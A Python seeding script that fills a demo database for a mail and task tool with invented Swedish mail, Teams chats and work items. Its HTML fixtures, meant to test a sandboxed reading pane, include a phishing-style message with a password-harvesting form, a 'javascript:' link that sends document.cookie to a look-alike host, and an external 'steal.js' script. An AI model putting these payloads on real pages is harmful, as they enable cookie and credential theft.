"""Fill a separate demo database with invented mail, for UI work and screenshots.

    TALOS_DSN="host=/tmp port=5433 dbname=talos_demo" TALOS_HOME=/tmp/talos-demo \
        uv run python scripts/demo.py && uv run talos serve --port 7421

Nothing here is real: people, companies and messages are made up. The demo never
touches the real talos database; it refuses to run against it.
"""

from __future__ import annotations

import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))

import mailfactory as mf  # noqa: E402

from psycopg.types.json import Jsonb  # noqa: E402

from talos import accounts, config, db, events, objects, personal, rules, work  # noqa: E402
from talos.ingest import Ingestor, Location  # noqa: E402
from talos.teams_ingest import Conversation, TeamsIngestor  # noqa: E402
from talos.vault import Vault  # noqa: E402

R = random.Random(7)
NOW = datetime(2026, 9, 23, 10, 40, tzinfo=timezone.utc)

PEOPLE = [("Oskar Nyström", "oskar@nordvik.se"), ("Helena Roos", "helena.roos@nordvik.se"),
          ("Erik Holm", "erik.holm@company.example"), ("Anna Berg", "anna.berg@company.example"),
          ("Jonas Wik", "jonas.wik@company.example"), ("Karin Ek", "karin.ek@company.example"),
          ("Patrik Sjö", "patrik@nordlys-it.se"), ("Lina Dahl", "lina.dahl@company.example")]
TOPICS = [("Brandväggsfönster fredag?", "Kan du bekräfta fredag 18–20 för ändringen?"),
          ("Loki retention — 30 eller 90 dagar?", "90 dagar är ungefär 180 GiB komprimerat."),
          ("Budget för observability-VM", "Har du en siffra före den 30:e?"),
          ("Ny medarbetare måndag", "Sara börjar måndag, kan dator och konton vara klara?"),
          ("Switchleverans flyttad", "Kärnswitcharna är försenade till 2 okt."),
          ("Offert licenser", "Här kommer offerten på 25 licenser.")]
RECEIPTS = [("Klarna", "noreply@klarna.com", "Ditt kvitto från Hemköp"), ("SJ", "noreply@sj.se", "Din resa Stockholm–Uppsala"),
            ("Blocket", "noreply@blocket.se", "Du har fått ett nytt meddelande"), ("Apple", "no_reply@email.apple.com", "Ditt kvitto från Apple")]


def when(days_back: float) -> datetime:
    return NOW - timedelta(days=days_back, minutes=R.randint(0, 600))


def main() -> None:
    s = config.load()
    if "dbname=talos_demo" not in s.dsn.replace(" ", " "):
        sys.exit("refusing: set TALOS_DSN to the talos_demo database")
    db.drop_database(s.dsn)
    db.ensure_database(s.dsn)
    with db.connect(s.dsn) as conn:
        db.migrate(conn)
        accounts.seed(conn)
        conn.commit()
        ing = Ingestor(conn, Vault(s.vault))
        n = 0

        def put(account, raw, labels=(), flags=("seen",), folder="[all]", thread=None, at=None):
            nonlocal n
            n += 1
            ing.ingest(account, raw, Location(folder, f"demo-{n}", uid=n, uidvalidity=1, provider_id=f"demo-{n}",
                                              labels=list(labels), flags=list(flags), provider_thread_id=thread,
                                              received_at=at))

        for i in range(160):
            name, addr = R.choice(PEOPLE)
            subj, body = R.choice(TOPICS)
            at = when(R.random() * 540)
            account = "work" if addr.endswith(("company.example", "nordvik.se", "nordlys-it.se")) else "gmail"
            me = "owner@company.example" if account == "work" else mf.ME
            put(account, mf.make(frm=f"{name} <{addr}>", to=me, subject=subj, body=body, date=at),
                labels=["\\Inbox"] if account == "gmail" else [], flags=[] if R.random() < .15 else ["seen"],
                folder="[all]" if account == "gmail" else "Inkorgen", thread=f"t{i % 40}", at=at)
            if R.random() < .35:
                reply_at = at + timedelta(hours=R.randint(1, 30))
                put(account, mf.make(frm=f"Alex <{me}>", to=addr, subject="SV: " + subj,
                                     body=f"Ja, det fungerar.\n\n-- \nAlex Lind\nCompany\n\n"
                                          f"Den {at:%d %b %Y} skrev {name} <{addr}>:\n> {body}\n>\n> Mvh {name.split()[0]}",
                                     date=reply_at), folder="[all]" if account == "gmail" else "Skickat",
                    thread=f"t{i % 40}", at=reply_at)
        for i in range(220):
            job = R.choice(["NAS nightly", "Proxmox vzdump", "M365 backup"])
            status = R.choices(["Success", "Warning", "Failed"], [0.86, 0.09, 0.05])[0]
            at = when(i * 1.3)
            put("work", mf.make(frm="Backup Reports <noreply@backup.example>", to="owner@company.example",
                               subject=f"[{status}] {job}", body=f"Job {job} finished: {status}.", date=at,
                               headers={"Auto-Submitted": "auto-generated"}), folder="Backup", at=at)
        for i in range(90):
            at = when(i * 3.1)
            put("work", mf.make(frm="Larmbolaget <larm@larmbolaget.example>", to="owner@company.example",
                               subject=R.choice(["Larm: inbrottslarm kontoret", "Larm återställt"]), body="Larmcentralen.",
                               date=at), folder="Alarm", at=at)
        for i in range(140):
            name, addr, subj = R.choice(RECEIPTS)
            at = when(R.random() * 500)
            atts = [("kvitto.pdf", "application/pdf", mf.pdf(f"Kvitto {1000 + i} Belopp {R.randint(49, 2400)} kr"))] \
                if R.random() < .6 else []
            put("gmail", mf.make(frm=f"{name} <{addr}>", subject=subj, body="Tack för ditt köp.", date=at,
                                 attachments=atts), labels=(["Receipts"] if name != "Blocket" else ["Blocket"]) + (["\\Inbox"] if i % 2 else []), at=at)
        for i in range(30):
            at = when(R.random() * 300)
            put("gmail", mf.make(frm="Skolan <info@skola.example>", subject=R.choice(["Veckobrev", "Utvecklingssamtal"]),
                                 body="Hej föräldrar!", date=at,
                                 attachments=[("bild.jpg", "image/jpeg", mf.jpeg())] if i % 5 == 0 else []),
                labels=["School"], at=at)
        for raw, at in html_mail():
            put("work", raw, folder="Inkorgen", at=at)
        conn.commit()
        print(f"{seed_teams(conn, ing)} demo Teams messages")
        conn.commit()
        rules.save(conn, rules.Rule("receipts", "Receipts become Orders", [{"field": "label", "op": "is", "value": "Receipts"}],
                                    {"dimension": "topic", "value": "Orders"}, priority=10))
        rules.save(conn, rules.Rule("groceries", "Hemköp is groceries", [{"field": "subject", "op": "contains", "value": "Hemköp"}],
                                    {"dimension": "topic", "value": "Family/Groceries"}, priority=5))
        rules.save(conn, rules.Rule("nordvik", "Nordvik is a customer", [{"field": "from_domain", "op": "is", "value": "nordvik.se"}],
                                    {"dimension": "tag", "value": "customer:nordvik"}, priority=20))
        conn.commit()
        print("rules", rules.run_all(conn))
        print("events", events.run(conn))
        conn.commit()
        print(f"{n} demo messages")
        print(f"{seed_work(conn)} demo work items")
        conn.commit()
        print(f"{seed_values(conn)} demo values (as if accepted from Jev), for the Structure page")
        conn.commit()


# ---------------------------------------------------------------- values
# Invented effective values, by sender, so the Structure page (talos structure plan) has something
# to place. Some mail is left undecided on purpose: it goes to Talos/To sort.
VALUES = {
    "backup.example": dict(sender_kind="machine", keep="short_lived", value="transient", type="backup", topic="Work/Backup"),
    "larmbolaget.example": dict(sender_kind="machine", keep="short_lived", value="transient", type="alarm", topic="Work/Alarm & facilities"),
    "klarna.com": dict(sender_kind="machine", keep="keep", value="record_financial", type="receipt", topic="Family/Groceries"),
    "sj.se": dict(sender_kind="machine", keep="keep", value="record_financial", type="booking", topic="Travel"),
    "email.apple.com": dict(sender_kind="machine", keep="keep", value="record_financial", type="receipt", topic="IT services"),
    "blocket.se": dict(sender_kind="machine", keep="short_lived", value="noise", type="listing_message", topic="Shopping/Marketplace"),
    "skola.example": dict(sender_kind="people", keep="short_lived", value="context", topic="School"),
    "nordvik.se": dict(sender_kind="people", sphere="work", keep="short_lived", value="context", topic="Work/Customers"),
    "nordlys-it.se": dict(sender_kind="people", sphere="work", keep="short_lived", value="context", topic="Work/Vendors"),
    "company.example": dict(sender_kind="people", sphere="work", keep="short_lived", value="context", topic="Work/Company"),
}


def seed_values(conn) -> int:
    n = 0
    rows = conn.execute("select id, split_part(from_address, '@', 2) as domain, direction, subject from message"
                        " where medium = 'email' order by id").fetchall()
    for i, r in enumerate(rows):
        values = VALUES.get(r["domain"])
        if not values or r["direction"] != "in" or i % 9 == 0:  # every ninth left undecided
            continue
        for dim, value in values.items():
            conn.execute("insert into assignment (entity_id, dimension_id, value, source_kind, source_ref, status)"
                         " values (%s, %s, %s, 'model', 'demo', 'active')", (r["id"], dim, value))
            n += 1
        if values["sender_kind"] == "people" and "?" in (r["subject"] or ""):
            conn.execute("insert into assignment (entity_id, dimension_id, value, source_kind, source_ref, status)"
                         " values (%s, 'ask', 'question', 'model', 'demo', 'proposed')", (r["id"],))
            n += 1
    return n


# ---------------------------------------------------------------- HTML mail
# Invented HTML mail for the reading pane's sandboxed frame: a newsletter laid out with tables and
# inline styles, with a logo as an inline (cid:) picture, remote images and a tracking pixel; and
# a phishing-style message with a <script>, event handlers, a form and a javascript: link. None of
# that may run or load: the frame is sandboxed, its CSP has no script, and the server cleans it.
NEWSLETTER = """<!doctype html><html><head><meta http-equiv="refresh" content="30;url=https://nordvik.example/landing">
<style>body{background:#eef1f4} .wrap{width:600px;max-width:100%;margin:0 auto;background:#fff}
.hero{background:#123a5c url('https://cdn.nordvik.example/hero.jpg') center/cover;color:#fff;padding:28px}
.btn{display:inline-block;background:#e0662a;color:#fff;padding:10px 18px;border-radius:4px;text-decoration:none}
td.price{text-align:right;font-variant-numeric:tabular-nums}</style>
<script>document.body.insertAdjacentText('afterbegin', 'SCRIPT RAN'); parent.postMessage('script ran', '*');</script></head>
<body onload="document.title='onload ran'"><table class="wrap" cellpadding="0" cellspacing="0" role="presentation">
<tr><td style="padding:18px 24px;border-bottom:3px solid #e0662a"><img src="cid:logo@nordvik.example" alt="Nordvik" width="120">
<span style="float:right;color:#667;font:12px Arial">Nyhetsbrev · september 2026</span></td></tr>
<tr><td class="hero"><h1 style="margin:0 0 6px;font:600 24px Georgia,serif">Höstens nätverksdagar</h1>
<p style="margin:0">Tre dagar om segmentering, Zero Trust och drift i små IT-miljöer.</p></td></tr>
<tr><td style="padding:20px 24px;font:15px/1.5 Arial;color:#222">
<p>Hej Alex,</p><p>Här är priserna för hösten. Anmäl dig före <b>15 oktober</b> för lägsta pris.</p>
<table width="100%" cellpadding="6" style="border-collapse:collapse;font:14px Arial">
<tr style="background:#123a5c;color:#fff"><th align="left">Paket</th><th align="right">Pris</th></tr>
<tr><td style="border-bottom:1px solid #dde">En dag</td><td class="price" style="border-bottom:1px solid #dde">2 900 kr</td></tr>
<tr><td style="border-bottom:1px solid #dde">Tre dagar</td><td class="price" style="border-bottom:1px solid #dde">6 900 kr</td></tr>
<tr><td>Tre dagar + workshop</td><td class="price"><b>8 400 kr</b></td></tr></table>
<p style="margin:22px 0"><a class="btn" href="https://nordvik.example/natverksdagar?utm=mail" onclick="alert('clicked')">Anmäl dig</a>
&nbsp; <a href="javascript:alert('javascript link ran')" style="color:#e0662a">Visa i webbläsaren</a></p>
<p><img src="http://cdn.nordvik.example/speakers.jpg" alt="Talarna på scen" width="552" height="200" style="border-radius:6px"
 onerror="document.body.append('ONERROR RAN')"></p>
<form action="https://nordvik.example/subscribe" method="post" style="background:#f4f6f8;padding:12px">
<label>Tipsa en kollega: <input type="email" name="email" placeholder="namn@foretag.se"></label> <button>Skicka</button></form>
<iframe src="https://nordvik.example/embed" width="1" height="1"></iframe>
</td></tr><tr><td style="padding:14px 24px;background:#f4f6f8;font:11px Arial;color:#778">
Nordvik Utbildning AB · Storgatan 1 · 111 22 Stockholm · <a href="https://nordvik.example/avregistrera">Avregistrera</a>
<img src="https://track.nordvik.example/open.gif?u=seb&amp;c=sep26" width="1" height="1" alt="" style="display:block"></td></tr>
</table></body></html>"""
PHISH = """<html><body style="font-family:Segoe UI,Arial;background:#fff">
<div style="max-width:520px;margin:20px auto;border:1px solid #ddd;padding:24px">
<img src="https://login.m1crosoft-support.example/logo.png" alt="Microsoft" width="108">
<h2 style="font-weight:400">Ditt lösenord går ut i dag</h2>
<p>Bekräfta ditt konto för att fortsätta använda Outlook.</p>
<form action="https://login.m1crosoft-support.example/collect" method="post">
<p><input name="user" value="owner@company.example"></p><p><input type="password" name="pw" placeholder="Lösenord"></p>
<button type="submit" style="background:#0067b8;color:#fff;border:0;padding:8px 20px">Logga in</button></form>
<p><a href="JaVaScRiPt:fetch('https://login.m1crosoft-support.example/?c='+document.cookie)">Behåll mitt lösenord</a></p>
<svg onload="alert('svg ran')"><script>alert('svg script ran')</script></svg>
<object data="https://login.m1crosoft-support.example/x.swf"></object>
<script src="https://login.m1crosoft-support.example/steal.js"></script>
</div></body></html>"""
PERSONAL = """<div dir="ltr"><p>Hej Alex!</p><p>Här är sammanställningen du bad om:</p>
<table border="1" cellpadding="4" style="border-collapse:collapse"><tr><th>Plats</th><th>Switchar</th><th>Leverans</th></tr>
<tr><td>Plan 2</td><td>3</td><td>2 okt</td></tr><tr><td>Plan 3</td><td>2</td><td>2 okt</td></tr></table>
<p>Mvh<br><b>Patrik Sjö</b><br><span style="color:#888">Nordlys IT</span></p></div>"""


def _html_message(frm: str, subject: str, html: str, plain: str, at: datetime, logo: tuple[str, bytes] | None = None) -> bytes:
    from email.message import EmailMessage
    from email.utils import format_datetime

    m = EmailMessage()
    m["From"] = frm
    m["To"] = "owner@company.example"
    m["Subject"] = subject
    m["Date"] = format_datetime(at)
    m["Message-ID"] = f"<html-{abs(hash((frm, subject)))}@demo.invalid>"
    m.set_content(plain)
    m.add_alternative(html, subtype="html")
    if logo:
        m.get_payload()[1].add_related(logo[1], maintype="image", subtype="png", cid=f"<{logo[0]}>")
    return m.as_bytes()


def _logo() -> bytes:
    from io import BytesIO

    from PIL import Image, ImageDraw
    im = Image.new("RGB", (240, 60), (18, 58, 92))
    ImageDraw.Draw(im).text((14, 20), "NORDVIK", fill=(255, 255, 255))
    buf = BytesIO()
    im.save(buf, "PNG")
    return buf.getvalue()


def html_mail() -> list[tuple[bytes, datetime]]:
    return [
        (_html_message("Nordvik Utbildning <nyhetsbrev@nordvik.example>", "Höstens nätverksdagar: priser och program",
                       NEWSLETTER, "Höstens nätverksdagar. Priser: en dag 2 900 kr, tre dagar 6 900 kr.",
                       NOW - timedelta(hours=5), ("logo@nordvik.example", _logo())), NOW - timedelta(hours=5)),
        (_html_message("Microsoft 365 <security@m1crosoft-support.example>", "Ditt lösenord går ut i dag",
                       PHISH, "Bekräfta ditt konto.", NOW - timedelta(hours=9)), NOW - timedelta(hours=9)),
        (_html_message("Patrik Sjö <patrik@nordlys-it.se>", "Switchar per plan", PERSONAL,
                       "Hej Alex! Plan 2: 3 switchar, plan 3: 2 switchar, leverans 2 okt.", NOW - timedelta(hours=26)),
         NOW - timedelta(hours=26)),
    ]


# ---------------------------------------------------------------- Teams
# Invented chats, stored as the Teams sync stores them (talos.teams_ingest): a one-to-one, a
# group with a topic, a group without one (named by its members), and a long, busy group chat of
# a few hundred lines over a week, with a shared file, an edit and a deletion.
T_ME = {"userId": "u-me", "displayName": "Alex Lind", "email": "owner@company.example"}
T_PEOPLE = {n.split()[0].lower(): {"userId": f"u-{n.split()[0].lower()}", "displayName": n, "email": a}
            for n, a in PEOPLE if a.endswith("company.example")}
CHAT_LINES = ["Har någon koll på varför VPN:en är seg idag?", "Kollar", "Ser ut som att tunneln flappar mot Uppsala",
              "Startar om IPsec-fasen", "Nu ser det bättre ut", "Tack!", "Backupen i natt gick igenom, men tog 40 min extra",
              "Det är nog den nya fildelningen som växt", "Ska vi flytta fönstret till 02?", "Låter rimligt",
              "Jag tar det med leverantören", "Printern på plan 3 är offline igen", "Någon som är på plats?",
              "Jag går förbi efter lunch", "Fixat, det var en lös nätverkskabel", "Grafana visar att diskarna på NAS:en är på 87 %",
              "Vi behöver beställa fler diskar innan jul", "Jag lägger en offert i planner", "👍", "Ok",
              "Mötet om brandväggen flyttas till torsdag 14:00", "Passar mig", "Jag kan inte torsdag, kan vi köra fredag?",
              "Fredag 10 då?", "Kör på det", "Certifikatet för webmail går ut om 12 dagar", "Jag förnyar det i morgon",
              "Glöm inte att uppdatera den interna CA:n också", "Bra påminnelse", "Sara får sin dator på måndag",
              "Konton är skapade, MFA återstår", "Jag hjälper henne med MFA på plats", "Ny version av UniFi ute, ska vi vänta?",
              "Vänta en vecka och se om det kommer en fix", "Håller med", "Larmet i serverrummet gick 03:12",
              "Temperaturen var normal, troligen en glapp sensor", "Jag ringer Larmbolaget", "Uppdatering: de byter sensorn på onsdag"]


def _tmsg(n, who, text, at, *, attachments=(), edited=None, deleted=False):
    iso = lambda t: t.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")  # noqa: E731
    return {"id": f"demo{n}", "messageType": "message", "createdDateTime": iso(at),
            "lastModifiedDateTime": iso(edited or at), "lastEditedDateTime": iso(edited) if edited else None,
            "deletedDateTime": iso(at + timedelta(minutes=3)) if deleted else None, "subject": None, "importance": "normal",
            "from": {"user": {"id": who["userId"], "displayName": who["displayName"], "userIdentityType": "aadUser"}},
            "body": {"contentType": "html", "content": "" if deleted else f"<p>{text}</p>"},
            "attachments": list(attachments), "mentions": [], "reactions": []}


def _work_time(t: datetime) -> datetime:
    """Push a moment into office hours (08–17 local-ish, weekdays), so the chat reads like a workday."""
    while t.weekday() >= 5:
        t += timedelta(days=1)
    if t.hour < 7:
        t = t.replace(hour=7, minute=R.randint(0, 50))
    if t.hour >= 16:
        t = (t + timedelta(days=1)).replace(hour=7, minute=R.randint(0, 50))
        return _work_time(t)
    return t


def seed_teams(conn, ing: Ingestor) -> int:
    tin = TeamsIngestor(ing, "teams")
    tin.set_me(T_ME["userId"])
    p = T_PEOPLE
    tin.learn_members([T_ME, *p.values()])
    n = 0

    def chat(cid, topic, members, chat_type, lines):
        nonlocal n
        ids = [T_ME["userId"]] + [m["userId"] for m in members]
        names = [m["displayName"] for m in members]
        conv = Conversation(kind="chat", key_prefix=f"chat:{cid}", thread_key=f"chat:{cid}", folder="Teams/Chats",
                            subject=topic, fallback_subject=", ".join(names[:4]), member_ids=ids,
                            meta={"chat_id": cid, "chat_type": chat_type})
        for who, text, at, extra in lines:
            n += 1
            tin.ingest(conv, _tmsg(n, who, text, at, **extra))

    # A one-to-one with Erik: a short exchange over two days.
    erik, t = p["erik"], NOW - timedelta(days=1, hours=5)
    one = [(erik, "Hej! Hinner du titta på switchkonfigurationen innan fredag?", t, {}),
           (erik, "Jag har lagt upp ett utkast", t + timedelta(minutes=1), {"attachments": [
               {"id": "f-sw", "contentType": "reference", "name": "Kärnswitch utkast.xlsx",
                "contentUrl": "https://company.sharepoint.com/sites/it/Kärnswitch%20utkast.xlsx"}]}),
           (T_ME, "Absolut, jag tittar i eftermiddag", t + timedelta(minutes=9), {}),
           (T_ME, "VLAN 40 saknar en trunk mot plan 2, annars ser det bra ut", t + timedelta(hours=3), {}),
           (erik, "Bra fångat, jag lägger till den", t + timedelta(hours=3, minutes=4), {}),
           (erik, "Uppdaterat nu", t + timedelta(hours=3, minutes=30), {"edited": t + timedelta(hours=3, minutes=33)}),
           (T_ME, "Toppen, då kör vi fredag 18:00", NOW - timedelta(hours=2), {}),
           (erik, "👍", NOW - timedelta(hours=1, minutes=55), {})]
    chat("19:demo-erik@unq.gbl.spaces", None, [erik], "oneOnOne", one)

    # A group with a topic.
    t = NOW - timedelta(days=3, hours=2)
    grp = [(p["anna"], "Offerten på licenserna har kommit", t, {}),
           (p["karin"], "Hur mycket landade den på?", t + timedelta(minutes=6), {}),
           (p["anna"], "Ungefär 10 % över budget", t + timedelta(minutes=8), {}),
           (T_ME, "Jag frågar om vi kan få treårsavtal i stället", t + timedelta(minutes=30), {}),
           (p["karin"], "Bra idé", t + timedelta(minutes=31), {}),
           (p["anna"], "Detta meddelande togs bort", t + timedelta(minutes=40), {"deleted": True}),
           (T_ME, "Återförsäljaren återkommer i morgon", t + timedelta(days=1, hours=1), {}),
           (p["anna"], "Perfekt, tack", t + timedelta(days=1, hours=1, minutes=5), {})]
    chat("19:demo-licenser@thread.v2", "Licensförnyelse 2026", [p["anna"], p["karin"]], "group", grp)

    # A group without a topic, named by its members.
    t = NOW - timedelta(days=6)
    chat("19:demo-lunch@thread.v2", None, [p["jonas"], p["lina"]], "group",
         [(p["jonas"], "Lunch på torsdag?", t, {}), (p["lina"], "Ja!", t + timedelta(minutes=2), {}),
          (T_ME, "Jag är med", t + timedelta(minutes=20), {})])

    # The long one: a few hundred lines over a week, in bursts.
    members = [p["anna"], p["erik"], p["jonas"], p["karin"], p["lina"]]
    everyone = [T_ME, *members]
    at, lines = _work_time(NOW - timedelta(days=8)), []
    while at < NOW - timedelta(minutes=20) and len(lines) < 320:
        who = R.choice(everyone)
        for _ in range(R.choice([1, 1, 1, 2, 2, 3])):  # someone often writes a few lines in a row
            at = _work_time(at + timedelta(minutes=R.choice([0, 1, 1, 2, 4, 9, 25, 70])))
            if at >= NOW - timedelta(minutes=20):
                break
            lines.append((who, R.choice(CHAT_LINES), at, {}))
    lines[len(lines) // 2] = (*lines[len(lines) // 2][:3], {"attachments": [
        {"id": "f-nas", "contentType": "reference", "name": "NAS kapacitet.pdf",
         "contentUrl": "https://company.sharepoint.com/sites/it/NAS%20kapacitet.pdf"}]})
    chat("19:demo-drift@thread.v2", "Driftgruppen", members, "group", lines)
    return n


BINDERS = [("project", "FortiDLP Renewal",
            "## Purpose\n\nRenew the DLP licences **before 31 October**, without a gap in coverage.\n\n"
            "## Outcome\n\nA signed quote for 25 seats, and the renewal date in the calendar.\n\n"
            "## Current context\n\n- The reseller has sent a first offer.\n- Finance wants the figure *before the 30th*.\n"
            "- Compare with the [vendor's licence guide](https://example.com/dlp-licensing).\n\n"
            "## What belongs here\n\n1. Quotes and licence counts\n2. Contact with the reseller\n3. Anything about `fortidlp-agent` rollout\n"),
           ("project", "Observability VM",
            "## Purpose\n\nOne VM for Loki and Grafana, so logs from the core services end up in one place.\n\n"
            "## Current context\n\nRetention is undecided: 30 days is cheap, 90 days is about **180 GiB** compressed.\n\n"
            "## Outcome\n\n- Loki and Grafana running on the VM\n- Retention decided and written down\n- Alerts routed to [[Security]]\n"),
           ("area", "Security",
            "## Purpose\n\nKeep the office and its systems safe: firewalls, alarms, access.\n\n"
            "## What belongs here\n\n- Firewalls and change windows\n- The alarm contract and its incidents\n- Access reviews\n\n"
            "## What does not belong here\n\nLicence renewals go to their own project."),
           ("area", "IT Operations", ""),
           ("topic", "AI Tooling", "Agents, models and the tools around them.\n\n### Worth trying\n\n- The new agent SDK\n- Local models for triage"),
           ("system", "Check Point", "## Purpose\n\nThe office firewall.\n\n## Current context\n\nR81.20, change window on **Fridays 18–20**."),
           ("system", "UniFi", ""),
           ("personal_project", "Gmail Labelling", "")]
KIND_DIR = {"project": "Projects", "personal_project": "Personal Projects", "area": "Areas", "topic": "Topics", "system": "Systems"}
BINDER_META = {"FortiDLP Renewal": {"age": 62}, "Observability VM": {"age": 45}, "Security": {"age": 400},
               "AI Tooling": {"age": 120, "lifecycle": "exploring"},
               "Check Point": {"age": 700, "state": {"health": "ok", "version": "R81.20", "update_available": True,
                                                       "security_findings": 0, "observed_at": "2026-09-21T07:00:00Z"}},
               "UniFi": {"age": 500, "state": {"health": "degraded", "version": "9.0.114", "observed_at": "2026-09-22T06:30:00Z"}}}
RELATED = {"FortiDLP Renewal": ["Security"], "Observability VM": ["IT Operations"], "Check Point": ["Security"]}
WORK_RELATED = [("Confirm Friday's firewall change window", "Security"), ("Ask for the renewal quote", "Security"),
                ("Decide Loki retention: 30 or 90 days", "IT Operations")]
HISTORY = {"Decide Loki retention: 30 or 90 days": [("inbox", 0), ("next", 12), ("doing", 5)],
           "Ask for the renewal quote": [("inbox", 0), ("next", 20), ("doing", 3)],
           "Budget figure for the observability VM": [("next", 0), ("doing", 9), ("blocked", 2)],
           "Confirm Friday's firewall change window": [("inbox", 0), ("next", 1)],
           "Rotate the Check Point admin password": [("next", 0), ("doing", 15), ("done", 14)]}
WORK_BODY = "## Desired outcome\n\nDone and written down.\n\n- first step\n- second step"
NOTES = [("FortiDLP Renewal", "decision", "Stay with FortiDLP for another year",
          "We keep **FortiDLP** for one more year; a vendor comparison waits until spring.\n\n- Cheaper than switching now\n- The agent rollout is finished", 18),
         ("FortiDLP Renewal", "receipt", "Routing receipt: reseller offer filed",
          "Filed the reseller's offer here, by subject and sender.", 9),
         ("FortiDLP Renewal", "sources", "Sources", "- Reseller portal\n- [Licence guide](https://example.com/dlp-licensing)", 60),
         ("Observability VM", "research", "Loki retention costs",
          "## Numbers\n\n30 days: about 60 GiB. 90 days: about 180 GiB.\n\n`chunk_target_size` stays at the default.", 11),
         ("Observability VM", "decision", "Grafana goes on the same VM", "One VM is enough for now.", 30),
         ("Security", "incident", "Alarm went off without cause", "The sensor in the storage room. Larmbolaget checked it; **no break-in**.", 22),
         ("Security", "state", "Recent state", "All firewalls on current versions. Next access review in November.", 4),
         ("Check Point", "state", "Recent state", "R81.20 with the latest jumbo hotfix. An update is available.", 3),
         ("Check Point", "signal", "Check Point: update available", "A new take of R81.20 is out.", 2),
         ("AI Tooling", "research", "Agent SDK first look", "*Worth a weekend.* Tool use works; streaming too.", 16)]
MEMBER_MAIL = [("Check Point", "Brandväggsfönster fredag?"), ("Observability VM", "Loki retention — 30 eller 90 dagar?"),
               ("FortiDLP Renewal", "Offert licenser"), ("Security", "Larm: inbrottslarm kontoret")]
WORK = [("Confirm Friday's firewall change window", "next", "Check Point", "Brandväggsfönster fredag?", 2, None, False),
        ("Decide Loki retention: 30 or 90 days", "doing", "Observability VM", "Loki retention — 30 eller 90 dagar?", 5, None, True),
        ("Budget figure for the observability VM", "blocked", "Observability VM", "Budget för observability-VM", -2, None, False),
        ("Laptop and accounts for Sara", "next", "IT Operations", "Ny medarbetare måndag", 4, None, False),
        ("Replan the core switch install", "inbox", None, "Switchleverans flyttad", None, None, False),
        ("Ask for the renewal quote", "doing", "FortiDLP Renewal", "Offert licenser", 8, None, False),
        ("Compare DLP vendors", "someday", "FortiDLP Renewal", None, None, -1, False),
        ("Review the alarm contract with Larmbolaget", "next", "Security", None, None, None, True),
        ("Try the new agent SDK", "someday", "AI Tooling", None, None, 20, False),
        ("Clean up Gmail labels", "inbox", "Gmail Labelling", None, None, None, False),
        ("Update UniFi controller", "done", "UniFi", None, None, None, False),
        ("Rotate the Check Point admin password", "done", "Check Point", None, None, None, False)]


def seed_work(conn) -> int:
    """Binders, work items, notes and history, invented like the mail, so the Work view, the boards,
    the About panels and the activity logs have something to show."""
    homes = {}
    for kind, name, body in BINDERS:
        meta = BINDER_META.get(name, {})
        homes[name] = objects.create(conn, kind, name, description=objects.purpose(body),
                                     attrs={"lifecycle": meta.get("lifecycle", "active"),
                                            "created": (NOW.date() - timedelta(days=meta.get("age", 200))).isoformat(),
                                            **({"state": meta["state"]} if "state" in meta else {})})
        origin = {"source": "obsidian", "path": f"{KIND_DIR[kind]}/{name}/_home.md", "uid": f"demo-{kind}-{len(homes)}",
                  "imported_at": (NOW - timedelta(days=30)).isoformat()}
        conn.execute("update object set body = %s, origin = %s where id = %s", (body, Jsonb(origin), homes[name]))
    # And the quieter kinds: a collection with a live query, a case and a saved search.
    objects.create(conn, "collection", "Receipts", description="Everything labelled Receipts",
                   query=[{"field": "label", "op": "is", "value": "Receipts"}])
    case = objects.create(conn, "case", "Core switch delay", description="The delivery moved to 2 October")
    objects.add(conn, case, [r["id"] for r in conn.execute("select id from message where subject = 'Switchleverans flyttad'")])
    objects.create(conn, "saved_search", "Failed backups", query=[{"field": "subject", "op": "contains", "value": "[Failed]"}])
    for name, related in RELATED.items():
        for other in related:
            conn.execute("insert into edge (src, rel, dst, source) values (%s, 'related', %s, 'import:vault')"
                         " on conflict do nothing", (homes[name], homes[other]))
    today = NOW.date()
    items = {}
    for n, (title, status, home, subject, due, review, focus) in enumerate(WORK):
        mids = []
        if subject:
            row = conn.execute("select id from message where subject = %s order by received_at desc limit 1", (subject,)).fetchone()
            mids = [row["id"]] if row else []
        path = HISTORY.get(title, [])
        first = path[0][0] if path else status
        items[title] = wid = work.create(
            conn, title, status=first, home_id=homes.get(home), focus=focus,
            due=today + timedelta(days=due) if due is not None else None,
            review_after=today + timedelta(days=review) if review is not None else None,
            body=WORK_BODY if focus else "", message_ids=mids, created_at=NOW - timedelta(days=40 - n * 2, hours=n),
            by="import:vault" if n % 3 == 0 else personal.OWNER_ID)
        conn.execute("update work_item_event set at = %s where work_item_id = %s", (NOW - timedelta(days=40 - n * 2, hours=n), wid))
        # Replay the moves, each at its own earlier moment, so the history reads like real use.
        for st, days_ago in path[1:]:
            work.update(conn, wid, status=st, position=work.end_position(conn, st))
            conn.execute("update work_item_event set at = %s where work_item_id = %s and field <> 'created'"
                         " and at > now() - interval '1 minute'",
                         (NOW - timedelta(days=days_ago, hours=n), wid))
    for title, other in WORK_RELATED:
        work.relate(conn, items[title], homes[other])
    for home, kind, title, body, days_ago in NOTES:
        nid = conn.execute("insert into entity (kind) values ('note') returning id").fetchone()["id"]
        at = NOW - timedelta(days=days_ago)
        conn.execute("insert into note (id, object_id, kind, title, body, created_at, updated_at) values (%s, %s, %s, %s, %s, %s, %s)",
                     (nid, homes[home], kind, title, body, at, at))
    # Some of the mail belongs to the binders by hand, so their logs show messages too.
    for home, subject in MEMBER_MAIL:
        ids = [r["id"] for r in conn.execute("select id from message where subject = %s", (subject,))]
        if ids:
            objects.add(conn, homes[home], ids)
    return len(WORK)


if __name__ == "__main__":
    main()
